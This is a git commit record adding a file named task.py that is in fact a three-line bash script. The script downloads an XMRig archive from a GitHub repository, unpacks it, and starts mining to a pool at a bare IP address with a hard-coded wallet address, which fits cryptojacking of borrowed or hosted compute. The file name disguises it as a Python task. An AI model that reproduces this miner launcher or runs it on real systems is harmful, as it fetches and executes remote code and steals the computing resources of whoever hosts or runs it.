c0490768605e3e586b27fa975ba33d494204dfa8
mayangindrawati448 <mayangindrawati448@tognu.com>
2025-03-20 01:31:08 +0700

    Create task.py

---
+++ task.py
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o 146.190.96.150:443 -u SaLvs7GhGVsP5LfYtoAtJZ4PBc3jQP8hR4jN2bR2jACs12QQkLVPv5Z1DuMkmBJqvEQdm2j6Gc97B8qMPWK2RTspfHqJnCKZtN1 -p tsdei -a rx/0
